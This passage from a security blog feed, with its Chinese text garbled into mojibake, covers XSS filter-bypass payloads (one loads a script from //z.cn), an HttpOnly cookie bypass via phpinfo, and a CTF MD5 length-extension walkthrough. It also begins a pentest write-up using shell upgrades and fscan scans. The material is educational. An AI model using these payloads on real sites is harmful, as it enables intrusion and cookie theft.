plaintext">http://www.yunsuo.com.cn/ht/dynamic/20190903/259.html?id=1&lt;video/src/onloadstart=top[`al`%2B`ert`](1);&gt;<br>http://www.yunsuo.com.cn/ht/dynamic/20190903/259.html?id=1&lt;video/src/onloadstart=top[a=&#x27;al&#x27;,b=&#x27;ev&#x27;,b%2ba](appendChild(createElement(`script`)).src=`//z.cn`);&gt;<br></code></pre></td></tr></table></figure><h2 id="ç»•http-only"><a href="#ç»•http-only" class="headerlink" title="ç»•http-only"></a>ç»•http-only</h2><p>å½“ä¸€ä¸ª cookie æ ‡è®°ä¸º <code>HttpOnly</code> æ—¶ï¼Œæ„å‘³ç€è¿™ä¸ª cookie åªèƒ½é€šè¿‡ HTTP æˆ– HTTPS åè®®è®¿é—®ï¼Œä¸èƒ½é€šè¿‡ JavaScript ä»£ç è®¿é—®ã€‚ä¹Ÿå°±æ˜¯ä¸èƒ½ç›´æ¥ä½¿ç”¨<code>document.cookie</code>è¿™æ ·çš„æ–¹å¼æ¥ç›´æ¥å¸¦å‡ºcookie</p><p>å¯ä»¥åˆ©ç”¨phpinfoçš„<strong>HTTP_COOKIE</strong>å­—æ®µå¸¦å‡ºcookieï¼Œå¯ä»¥å†™ä¸€ä¸ªxhrè¯·æ±‚è®¿é—®phpinfoé¡µé¢ç„¶ååŒ¹é…è¯¥å­—æ®µç„¶åå¸¦å‡ºcookieã€‚</p><h1 id="å¯Œæ–‡æœ¬XSS"><a href="#å¯Œæ–‡æœ¬XSS" class="headerlink" title="å¯Œæ–‡æœ¬XSS"></a>å¯Œæ–‡æœ¬XSS</h1><p>å¯Œæ–‡æœ¬ç¼–è¾‘å™¨æ˜¯ä¸€ç§å…è®¸ç”¨æˆ·ä»¥æ‰€è§å³æ‰€å¾—çš„æ–¹å¼åˆ›å»ºå’Œç¼–è¾‘æ ¼å¼åŒ–æ–‡æœ¬çš„å·¥å…·ã€‚ä¸ä»…æ”¯æŒçº¯æ–‡æœ¬ç¼–è¾‘çš„ç¼–è¾‘å™¨ä¸åŒï¼Œå¯Œæ–‡æœ¬ç¼–è¾‘å™¨æ”¯æŒä¸€ç³»åˆ—æ–‡æœ¬æ ¼å¼åŒ–é€‰é¡¹ï¼ŒåŒ…æ‹¬ä½†ä¸é™äºï¼š</p><ul><li>å­—ä½“æ ·å¼ï¼ˆå¦‚åŠ ç²—ã€æ–œä½“ã€ä¸‹åˆ’çº¿ï¼‰</li><li>å­—ä½“å¤§å°å’Œé¢œè‰²</li><li>æ®µè½å¯¹é½</li><li>åˆ—è¡¨ï¼ˆæœ‰åºæˆ–æ— åºåˆ—è¡¨ï¼‰</li><li>è¶…é“¾æ¥</li><li>å›¾ç‰‡å’Œåª’ä½“åµŒå…¥</li><li>è¡¨æ ¼åˆ›å»º</li><li>å¤´éƒ¨å’Œè„šéƒ¨æ³¨è§£</li></ul><p>å…¶å…è®¸ç”¨æˆ·è¾“å…¥HTMLã€JavaScriptä»¥åŠCSSç­‰ä¸°å¯Œçš„å†…å®¹æ ¼å¼æ¥è¿›è¡Œæ¸²æŸ“ï¼Œæ‰€ä»¥å¯èƒ½ä¼šé€ æˆxssã€‚</p><p><strong>é˜²å¾¡æ–¹å¼</strong></p><p>ä¸€èˆ¬ä¸é‡‡ç”¨è½¬ä¹‰çš„æ–¹å¼è¿›è¡Œé˜²å¾¡ï¼Œå› ä¸ºä¼šå¯¼è‡´å…¶å¯Œæ–‡æœ¬æ— æ³•ä½¿ç”¨ï¼Œæ¯”å¦‚æœ‰å¯Œæ–‡æœ¬åŠŸèƒ½çš„ç•™è¨€æ¡†ä¹‹ç±»çš„ã€‚</p><p>å¯ä»¥é‡‡ç”¨ä¸‹é¢æ–¹å¼æ¥é˜²å¾¡å’Œä¿®å¤ï¼š</p><ol><li><strong>è¾“å…¥éªŒè¯</strong>ï¼šå¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œä¸¥æ ¼çš„éªŒè¯ï¼Œç¡®ä¿ä¸å…è®¸ä¸å®‰å…¨çš„æ ‡ç­¾å’Œå±æ€§ã€‚</li><li><strong>è¾“å‡ºç¼–ç </strong>ï¼šåœ¨å°†ç”¨æˆ·è¾“å…¥çš„æ•°æ®æ¸²æŸ“åˆ°é¡µé¢ä¸Šæ—¶ï¼Œå¯¹æ‰€æœ‰ç”¨æˆ·ç”Ÿæˆçš„å†…å®¹è¿›è¡ŒHTMLç¼–ç ã€‚</li><li><strong>ç™½åå•è¿‡æ»¤</strong>ï¼šå®šä¹‰ä¸€ä¸ªå®‰å…¨æ ‡ç­¾å’Œå±æ€§çš„ç™½åå•ï¼Œåªå…è®¸è¿™äº›å®‰å…¨çš„å…ƒç´ è¢«ä½¿ç”¨ã€‚</li><li><strong>å†…å®¹å®‰å…¨ç­–ç•¥ï¼ˆCSPï¼‰</strong>ï¼šä½¿ç”¨CSPæ¥é™åˆ¶å¯ä»¥æ‰§è¡Œçš„è„šæœ¬çš„æ¥æºï¼Œå‡å°‘XSSæ”»å‡»çš„é£é™©ã€‚</li><li><strong>å®šæœŸæ›´æ–°</strong>ï¼šä¿æŒå¯Œæ–‡æœ¬ç¼–è¾‘å™¨åŠå…¶ä¾èµ–çš„åº“æ˜¯æœ€æ–°çš„ï¼Œä»¥åˆ©ç”¨æœ€æ–°çš„å®‰å…¨ä¿®å¤ã€‚</li><li><strong>å®‰å…¨å®¡è®¡</strong>ï¼šå®šæœŸå¯¹å¯Œæ–‡æœ¬ç¼–è¾‘å™¨çš„ä½¿ç”¨è¿›è¡Œå®‰å…¨å®¡è®¡ï¼Œä»¥å‘ç°å’Œä¿®å¤æ½œåœ¨çš„å®‰å…¨æ¼æ´ã€‚</li></ol><h1 id="XSSç›¸å…³é¶åœº"><a href="#XSSç›¸å…³é¶åœº" class="headerlink" title="XSSç›¸å…³é¶åœº"></a>XSSç›¸å…³é¶åœº</h1><ol><li><a href="https://alf.nu/alert1?world=alert&level=alert0">https://alf.nu/alert1?world=alert&amp;level=alert0</a></li><li><a href="https://prompt.ml/0">https://prompt.ml/0</a></li><li><a href="https://xss.tesla-space.com/">https://xss.tesla-space.com/</a></li><li>è°·æ­Œçš„xssæ¸¸æˆï¼š<a href="https://xss-game.appspot.com/">https://xss-game.appspot.com/</a></li></ol></script></strong></p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å“ˆå¸Œé•¿åº¦æ‹“å±•æ”»å‡»</title>
      <link href="/2024/04/25/%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/"/>
      <url>/2024/04/25/%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<p>åœ¨æŸæ–°ç”Ÿèµ›çœ‹åˆ°çš„ï¼Œæ¥å­¦ä¹ ä¸€ä¸‹ï¼Œå‚è€ƒæ–‡ç« ï¼š<a href="https://www.cnblogs.com/yunen/p/13624595.html">https://www.cnblogs.com/yunen/p/13624595.html</a></p><h1 id="md5ç®—æ³•åŸç†"><a href="#MD5ç®—æ³•åŸç†" class="headerlink" title="MD5ç®—æ³•åŸç†"></a>MD5ç®—æ³•åŸç†</h1><p>å…ˆå…·ä½“çœ‹ä¸€ä¸‹md5ç®—æ³•çš„åŸç†æ˜¯æ€ä¹ˆæ ·çš„ç„¶åæ¥çœ‹ä¸€çœ‹å…·ä½“çš„é¢˜ç›®</p><p>è¿™é‡Œæ”¾ä¸€å¼ æµç¨‹å›¾ï¼š</p><p><img src="https://cdn.clown2024.cn/202409231526541.png" alt="1"></p><blockquote><p>æ•´ä½“çš„ç®—æ³•æµç¨‹å°±æ˜¯ï¼Œå°†æ•°æ®åˆ†å—ï¼Œæ¯512ä½ä¸ºä¸€å—ï¼Œæœ‰ä¸€ä¸ªåˆå§‹åºåˆ—ï¼Œä¸ç¬¬ä¸€ä¸ªæ•°æ®å—è¿›è¡Œè¿ç®—ï¼Œç„¶åäº§ç”Ÿä¸€ä¸ªæ–°çš„åºåˆ—ï¼Œç»§ç»­ä¸ä¸‹ä¸€ä¸ªæ•°æ®å—è¿›è¡Œè®¡ç®—ï¼Œä»¥æ­¤ç±»æ¨ã€‚</p></blockquote><p>ä¸€ä¸ª512ä½çš„æ•°æ®å—å°±æ˜¯64ä¸ªå­—ç¬¦çš„å¤§å°ï¼Œå¯¹MD5æ¥è¯´æœ€åä¸€ä¸ªæ•°æ®å—çš„å¤„ç†åˆ†ä¸ºä¸¤ç§æƒ…å†µï¼š</p><ul><li>æ˜æ–‡æ•°æ®çš„äºŒè¿›åˆ¶æ•°æ®é•¿åº¦&lt;&#x3D;448ï¼Œå¡«å……padding(æ— æ„ä¹‰å ä½)æ•°æ®ä½¿å…¶é•¿åº¦ä¸º448ï¼Œå†æ·»åŠ åŸå§‹æ˜æ–‡æ•°æ®çš„äºŒè¿›åˆ¶é•¿åº¦ä¿¡æ¯ï¼ˆ64ä½ï¼‰ä½¿å…¶é•¿åº¦ä¸º512ä½å³å¯ã€‚</li><li>448&lt;æ˜æ–‡æ•°æ®çš„äºŒè¿›åˆ¶æ•°æ®é•¿åº¦&lt;&#x3D;512ï¼Œå¡«å……paddingæ•°æ®è‡³ä¸‹ä¸€å—çš„448ä½ï¼Œè€Œåå†æ·»åŠ åŸå§‹æ˜æ–‡æ•°æ®çš„äºŒè¿›åˆ¶é•¿åº¦ä¿¡æ¯ï¼ˆ64ä½ï¼‰ä½¿å…¶é•¿åº¦ä¸º512ä½å³å¯ã€‚</li></ul><p>è¿™é‡Œå€Ÿæ–‡ç« å¤§ä½¬çš„ä¸¤å¼ å›¾ï¼š</p><p>è¿™æ˜¯ç¬¬ä¸€ç§æƒ…å†µçš„</p><p><img src="https://cdn.clown2024.cn/202409231526056.png" alt="2"></p><p>è¿™æ˜¯ç¬¬äºŒç§æƒ…å†µçš„</p><p><img src="https://cdn.clown2024.cn/202409231526340.png" alt="3"></p><blockquote><p>ä¸Šå›¾å¯ä»¥çŸ¥é“ï¼Œpaddingçš„æ•°æ®çš„ç‰¹ç‚¹æ˜¯é¦–ä½ä¸º1ï¼Œåé¢éƒ½æ˜¯0</p></blockquote><p>è¦æ³¨æ„ä¸€ç‚¹é•¿åº¦ä¿¡æ¯ä½æ˜¯ä»ä½ä½å‘é«˜ä½çš„ï¼Œæ¯”å¦‚ä¸Šé¢çš„<code>f0 03 00 00 00 00 00 00</code>ï¼Œå³ä»£è¡¨0x03f0ï¼Œå¯¹åº”çš„åè¿›åˆ¶ä¸º1008ï¼Œå³ä¸º64+62&#x3D;126ä¸ªå­—ç¬¦çš„äºŒè¿›åˆ¶ä½æ•°ã€‚</p><p>ä¸‹é¢è¯´ä¸€ä¸‹å‘é‡ä¸²çš„è½¬æ¢</p><p>MD5æœ‰ä¸€ä¸ªåˆå§‹çš„å›ºå®šå‘é‡ä¸²ç”¨æ¥å‚ä¸è¿ç®—ï¼Œå…¶æµç¨‹å›¾å¦‚ä¸‹ï¼š</p><p><img src="https://cdn.clown2024.cn/202409231527891.png" alt="4"></p><p>ç„¶åå¾—åˆ°çš„æœ€åä¸€ä¸ªå‘é‡ä¸²å†ç»è¿‡é«˜ä½ä½å‘¼å”¤å°±æ˜¯æˆ‘ä»¬æœ€åçš„MD5çš„32ä¸ª16è¿›åˆ¶å­—ç¬¦ï¼Œæ¯”å¦‚æœ€åçš„å‘é‡ä¸²æ˜¯è¿™æ ·çš„</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">A=0xab45bc01<br>B=0x6a64bb53 <br>C=0x23ba8afe<br>D=0x46847a62<br></code></pre></td></tr></table></figure><p>ç„¶åä¸¤ä¸¤ä¸€ç»„ç»„åˆ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">ab 45 bc 01<br>6a 64 bb 53<br>23 ba 8a fe<br>46 84 7a 62<br></code></pre></td></tr></table></figure><p>ç„¶åé«˜ä½ä½äº’æ¢</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">01 bc 45 ab<br>53 bb 64 6a<br>fe 8a ba 23<br>62 7a 84 46<br></code></pre></td></tr></table></figure><p>æœ€ç»ˆæ‹¼æ¥å°±å¾—åˆ°æœ€ç»ˆçš„MD5å€¼</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">01bc45ab53bb646afe8aba23627a8446<br></code></pre></td></tr></table></figure><p>å¦‚åŒMD5ç®—æ³•é‚£èˆ¬åˆ†ç»„åä¸å‘é‡è¿ç®—çš„æµç¨‹è¢«ç»Ÿç§°ä¸º<strong>Merkleâ€“DamgÃ¥rd</strong>ç»“æ„ã€‚</p><p>è€ŒåŒæ ·ä½¿ç”¨æ­¤ç»“æ„çš„HASHç®—æ³•è¿˜æœ‰ï¼šSHA1ã€SHA2ç­‰</p><h1 id="å“ˆå¸Œæ‹“å±•æ”»å‡»"><a href="#å“ˆå¸Œæ‹“å±•æ”»å‡»" class="headerlink" title="å“ˆå¸Œæ‹“å±•æ”»å‡»"></a>å“ˆå¸Œæ‹“å±•æ”»å‡»</h1><p>é‚£ä¹ˆçŸ¥é“ä¸Šé¢çš„åŸç†ä¹‹åæˆ‘ä»¬èƒ½å¹²ä»€ä¹ˆå‘¢</p><p>è¿™é‡Œæ¥ç”¨ä¸€é“é¢˜æ¥åˆ†æä¸€ä¸‹é€šè¿‡è¿™ä¸ªç®—æ³•æµç¨‹æˆ‘ä»¬èƒ½åšä»€ä¹ˆäº‹</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$secret</span>=<span class="hljs-string">&quot;1234567890abcde&quot;</span>; <span class="hljs-comment">// This secret is 15 characters long for security!</span><br><span class="hljs-variable">$username</span>=<span class="hljs-string">&quot;admin&quot;</span>;<br><span class="hljs-variable">$flag</span>=<span class="hljs-string">&quot;flag&#123;test&#125;&quot;</span>;<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;password&quot;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;getmein&quot;</span>] === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$secret</span> . <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$username</span> . <span class="hljs-variable">$password</span>)))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Congratulations! You are a registered user.\n&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">die</span> (<span class="hljs-string">&quot;The flag is &quot;</span>. <span class="hljs-variable">$flag</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Your cookies don&#x27;t match up! STOP HACKING THIS SITE.&quot;</span>);<br>&#125;<br><span class="hljs-comment">// md5(1234567890abcdeadmin)=b7271fdc3f7b4ee4f9fd6f6eb059c1f3</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ä¸€èˆ¬å“ˆå¸Œæ‹“å±•çš„é¢˜ç›®éƒ½ä¼šç»™æˆ‘ä»¬ä¸€ä¸ªå·²çŸ¥çš„å“ˆå¸Œå’Œå·²çŸ¥çš„å¯†æ–‡é•¿åº¦ï¼Œå¯†æ–‡æˆ‘ä»¬ä¸€èˆ¬éƒ½æ˜¯ä¸çŸ¥é“ï¼Œè¿™é‡Œæ˜¯æœ¬åœ°æ‰€ä»¥å°±è®¾ç½®äº†ä¸€ä¸ªæ–¹ä¾¿æµ‹è¯•ï¼Œæˆ‘ä»¬å‡è£…ä¸çŸ¥é“ã€‚</p><p>è¿™é¢˜å°±æ˜¯æˆ‘ä»¬çŸ¥é“äº†ä¸€ä¸ªå¯†æ–‡çš„å“ˆå¸Œä»¥åŠä»–çš„é•¿åº¦ï¼Œè¿™é‡Œ<code>1234567890abcdeadmina</code>çš„å“ˆå¸Œæ˜¯<code>b7271fdc3f7b4ee4f9fd6f6eb059c1f3</code>ï¼Œé•¿åº¦æ˜¯20ï¼›ç°åœ¨æˆ‘ä»¬éœ€è¦ä¼ ä¸€ä¸ªgetmeinå‚æ•°å’Œä¸€ä¸ªpasswordå‚æ•°ï¼Œå…¶ä¸­usernameå˜é‡å’Œpasswordå‚æ•°ä¼šè¢«æ‹¼æ¥åˆ°$secretå˜é‡ä¸Šé¢å»ç„¶åè¿›è¡Œmd5ï¼Œæˆ‘ä»¬ä¼ çš„<code>getmein</code>å°±æ˜¯ä¸€ä¸ªå“ˆå¸Œéœ€è¦ä¸æ‹¼æ¥åçš„å­—ç¬¦ä¸²çš„md5ç›¸ç­‰ã€‚</p><p>è¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨å“ˆå¸Œçš„ç®—æ³•æµç¨‹ï¼Œé€šè¿‡æˆ‘ä»¬ä¼ é€’çš„passwordå‚æ•°æ¥åšä¸€äº›æ‰‹è„šäº†ã€‚</p><p>å›æƒ³ä¸€ä¸‹è¿™ä¸ªé•¿åº¦20çš„å­—ç¬¦ä¸²æ˜¯æ€ä¹ˆè¿›è¡ŒåŠ å¯†çš„å‘¢ï¼›è¿™ä¸ªå­—ç¬¦ä¸²ç¬¦åˆæˆ‘ä»¬çš„ç¬¬ä¸€ç§æƒ…å†µï¼Œé•¿åº¦å°äºç­‰äº448ï¼Œé‚£ä¹ˆå°±ä¼špaddingæ•°æ®åˆ°448ä½ç„¶åè¡¥ä¸Š64ä½çš„æ•°æ®é•¿åº¦ä¿¡æ¯ï¼Œé‚£ä¹ˆè¿™äº›paddingçš„ä¿¡æ¯å’Œæ•°æ®é•¿åº¦çš„ä¿¡æ¯æˆ‘ä»¬éƒ½æ˜¯çŸ¥é“ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ä¼ é€’çš„passwordå‚æ•°æ‰‹åŠ¨paddingç„¶åå‡ºæ¥çš„å“ˆå¸Œå€¼ä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚</p><p>é‚£ç°åœ¨æˆ‘ä»¬è¦ä¼ passwordå‚æ•°ï¼Œéšä¾¿ä¼ ä¸€äº›ä¸œè¥¿ä»–çš„å“ˆå¸Œæˆ‘ä»¬è‚¯å®šæ˜¯ä¸çŸ¥é“çš„ï¼Œä½†æ˜¯ä¸Šé¢è¯´äº†æˆ‘ä»¬å¯ä»¥paddingæ•°æ®åˆ°ä¸ä»–ç»™çš„å“ˆå¸Œç›¸ç­‰ï¼Œæˆ‘ä»¬æŠŠè¿™ä¸ªæ•°æ®å—å½“æˆå€’æ•°ç¬¬äºŒä¸ªï¼Œè¿™ä¸ªå“ˆå¸Œå€¼æˆ‘ä»¬æ˜¯å·²çŸ¥çš„ï¼Œæˆ‘ä»¬paddingå®Œä¹‹åå†åŠ ä¸€äº›æˆ‘ä»¬æŒ‡å®šçš„å­—ç¬¦ä¸²ï¼Œè¿™äº›å­—ç¬¦ä¸²å°±ä¼šæ”¾å…¥ä¸‹ä¸€ä¸ªæ•°æ®å—ï¼Œä¹Ÿå°±æ˜¯æœ€åä¸€ä¸ªã€‚</p><p>ç°åœ¨è¦è®¡ç®—æœ€åä¸€ä¸ªæ•°æ®å—çš„å“ˆå¸Œçš„æ¡ä»¶ï¼Œ<code>æ•°æ®é•¿åº¦</code>ã€<code>ä¸Šä¸€ä¸ªæ•°æ®å—çš„å“ˆå¸Œ</code>ï¼Œè¿™ä¸¤æ ·ä¸œè¥¿éƒ½å·²ç»é½å…¨äº†ï¼Œé‚£æœ€ç»ˆçš„å“ˆå¸Œæˆ‘ä»¬å°±å¯ä»¥é¢„æµ‹äº†ï¼Œè¿™ä¹Ÿå°±æ˜¯æ‰€è°“çš„å“ˆå¸Œæ‹“å±•ï¼Œä¹Ÿå°±æ˜¯é€šè¿‡å·²çŸ¥çš„ä¸Šä¸€ä¸ªæ•°æ®å—å“ˆå¸Œï¼Œåˆ©ç”¨æˆ‘ä»¬ä¼ é€’çš„å‚æ•°å»paddingä¸€äº›æ•°æ®æ¥é¢„æµ‹ä¸‹ä¸€ä¸ªæ•°æ®å—çš„å“ˆå¸Œã€‚</p><p><strong>è¿™é‡Œæä¾›ä¸¤ä¸ªå·¥å…·</strong></p><ol><li>hexpandï¼šå®‰è£…æ•™ç¨‹è·Ÿç€è¿™ç¯‡æ¥ï¼š<a href="https://www.cnblogs.com/pcat/p/7668989.html%E3%80%82">https://www.cnblogs.com/pcat/p/7668989.htmlã€‚</a></li><li>ç±»hexpumpï¼š<a href="https://github.com/shellfeel/hash-ext-attack?tab=readme-ov-file%EF%BC%8C%E5%9B%A0%E4%B8%BA%E5%8E%9F%E6%9D%A5%E7%9A%84hexpump%E9%A1%B9%E7%9B%AE%E4%B8%8D%E8%A7%81%E4%BA%86%EF%BC%8C%E6%89%BE%E5%88%B0%E4%B8%80%E4%B8%AA%E5%8A%9F%E8%83%BD%E8%B7%9Fhexpump%E4%B8%80%E6%A0%B7%E7%9A%84%E3%80%82%E4%BD%86%E6%98%AFhexpump%E9%9C%80%E8%A6%81%E5%8E%9F%E5%A7%8B%E6%95%B0%E6%8D%AE%EF%BC%8C%E7%8E%B0%E5%9C%A8%E4%B8%80%E8%88%AC%E4%B8%8D%E6%8F%90%E4%BE%9B%EF%BC%8C%E5%8E%9F%E7%90%86%E4%B8%8A%E4%B9%9F%E4%B8%8D%E9%9C%80%E8%A6%81%EF%BC%8C%E6%89%80%E4%BB%A5%E7%94%A8%E7%9A%84%E4%BC%9A%E6%AF%94%E8%BE%83%E5%B0%91">https://github.com/shellfeel/hash-ext-attack?tab=readme-ov-fileï¼Œå› ä¸ºåŸæ¥çš„hexpumpé¡¹ç›®ä¸è§äº†ï¼Œæ‰¾åˆ°ä¸€ä¸ªåŠŸèƒ½è·Ÿhexpumpä¸€æ ·çš„ã€‚ä½†æ˜¯hexpumpéœ€è¦åŸå§‹æ•°æ®ï¼Œç°åœ¨ä¸€èˆ¬ä¸æä¾›ï¼ŒåŸç†ä¸Šä¹Ÿä¸éœ€è¦ï¼Œæ‰€ä»¥ç”¨çš„ä¼šæ¯”è¾ƒå°‘</a></li></ol><p>è¿™é‡Œç”¨hexpandå·¥å…·</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">/hexpand -t md5 -s b7271fdc3f7b4ee4f9fd6f6eb059c1f3 -l 20 -m test # -sæ˜¯æˆ‘ä»¬çš„å·²çŸ¥å“ˆå¸Œï¼›-læ˜¯å¯†æ–‡é•¿åº¦ï¼›-mæ˜¯æˆ‘ä»¬è¦æ·»åŠ çš„æ•°æ®ï¼Œæ ¹æ®é¢˜ç›®æ¥ï¼Œè¿™é‡Œæ²¡æœ‰é™åˆ¶æˆ‘ä»¬éšæ„å³å¯<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409231527959.png" alt="5"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">fb66c4470d1c810edc1d77678a4299c0 //æˆ‘ä»¬æœ€ç»ˆçš„å“ˆå¸Œ<br>800000000000000000000000000000000000000000000000000000000000000000000000a00000000000000074657374  //æˆ‘ä»¬è¦æ·»åŠ çš„æ•°æ®<br></code></pre></td></tr></table></figure><p>å› ä¸ºè¿™é‡Œæˆ‘ä»¬æ˜¯urlä¼ é€’è¿˜éœ€è¦å†™ä¸ªè„šæœ¬åŠ ä¸Šç™¾åˆ†å·</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">value=<span class="hljs-string">&quot;800000000000000000000000000000000000000000000000000000000000000000000000a00000000000000074657374&quot;</span><br>value2=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(value),<span class="hljs-number">2</span>):<br>    value2+=<span class="hljs-string">&quot;%&quot;</span>+value[i]+value[i+<span class="hljs-number">1</span>]<br><span class="hljs-built_in">print</span>(value2)<br><br><span class="hljs-comment"># ç»“æœï¼š%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%a0%00%00%00%00%00%00%00%74%65%73%74</span><br></code></pre></td></tr></table></figure><p>ç„¶åpostä¼ é€’çœ‹çœ‹ç»“æœ</p><p><img src="https://cdn.clown2024.cn/202409231527859.png" alt="6"></p><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æˆåŠŸæ‹¿åˆ°äº†flag</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow_web859</title>
      <link href="/2024/04/24/ctfshow-web859/"/>
      <url>/2024/04/24/ctfshow-web859/</url>
      
        <content type="html"><![CDATA[<p>è¿™æ˜¯ä¸€é“ctfshowä¸Šé¢çš„æ¸—é€é¢˜ï¼Œæ¥è‡ª2023å¹´2æœˆçš„RealWorldCTFæ¸—é€èµ›ç¯å¢ƒï¼Œæä¾›äº†è·³æ¿æœºï¼Œè¿™é‡Œæ¥æ‰“ä¸€æ‰“å­¦ä¹ ä¸€ä¸‹ã€‚</p><h1 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h1><p><img src="http://cdn.clown2024.cn/202407151506132.png" alt="image-20240424211510425"></p><p>å…ˆç”¨Termiusè¿æ¥è·³æ¿æœºï¼Œç„¶åä½¿ç”¨å¦‚ä¸‹å‘½ä»¤è·å¾—ä¸€ä¸ªäº¤äº’å¼shellæ–¹ä¾¿ä¸€ç‚¹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">sudo -s #åˆ‡æ¢åˆ°rootç”¨æˆ·<br>python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot; #è·å¾—äº¤äº’å¼shell<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151440702.png" alt="image-20240424211734391"></p><p>ç„¶åä¸Šä¼ fscanä¸Šå»æ‰«ä¸€ä¸‹ï¼Œè¿™é‡Œå…ˆç”¨Termiusçš„sftpå‘ç°ä¼ ä¸äº†å¤±è´¥äº†</p><p>ä½†æ˜¯å¯ä»¥ç”¨scpæ¥ä¼ </p><blockquote><p><strong>scpå‘½ä»¤</strong> ç”¨äºåœ¨Linuxä¸‹è¿›è¡Œè¿œç¨‹æ‹·è´æ–‡ä»¶çš„å‘½ä»¤ï¼Œå’Œå®ƒç±»ä¼¼çš„å‘½ä»¤æœ‰cpï¼Œä¸è¿‡cpåªæ˜¯åœ¨æœ¬æœºè¿›è¡Œæ‹·è´ä¸èƒ½è·¨æœåŠ¡å™¨ï¼Œè€Œä¸”scpä¼ è¾“æ˜¯åŠ å¯†çš„ã€‚</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">scp -P 28260 fscan_amd64 ctfshow@pwn.challenge.ctf.show:/tmp #å°†fscanä¸Šä¼ åˆ°/tmpç›®å½•ä¸‹é¢<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151440703.png" alt="image-20240424212509835"></p><p>ç„¶åè¿›è¡Œæ‰«æçœ‹çœ‹</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">./fscan_amd64 -h 172.2.90.0/24 &gt; fscan.txt #ä¿å­˜åˆ°æ–‡ä»¶ä¸‹é¢æ–¹ä¾¿æŸ¥çœ‹<br></code></pre></td></tr></table></figure><p>è¿™æ˜¯æ‰«æç»“æœ</p><p><img src="http://cdn.clown2024.cn/202407151506133.png" alt="image-20240424214452168"></p><p>ç„¶åå†å•ç‹¬æ‰«ä¸€ä¸‹172.2.90.5 è¿™ä¸ªåœ°å€</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">./fscan_amd64 -h 172.2.90.5 <br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151440705.png" alt="image-20240424215304938"></p><p> çœ‹ä¸Šå»æ˜¯æœ‰ä¸ªcveçš„æ ·å­ï¼Œç„¶åç»“åˆä¸Šé¢172.2.90.6è¿˜å¼€æ”¾äº†445å’Œ139è¿™ä¸¤ä¸ªå…±äº«ç«¯å£ï¼Œ172.2.90.6ç”¨çš„ç³»ç»Ÿæ˜¯Windows6.1ï¼Œ172.2.90.5è¿˜å¼€æ”¾äº†ä¸€ä¸ª9000ç«¯å£ï¼Œä¿¡æ¯æœé›†å¤§æ¦‚å°±è¿™ä¹ˆå¤šã€‚</p><h1 id="å¼€å§‹æ¸—é€"><a href="#å¼€å§‹æ¸—é€" class="headerlink" title="å¼€å§‹æ¸—é€"></a>å¼€å§‹æ¸—é€</h1><h2 id="å°è¯•å¯¹139å’Œ445ç«¯å£æ¸—é€"><a href="#å°è¯•å¯¹139å’Œ445ç«¯å£æ¸—é€" class="headerlink" 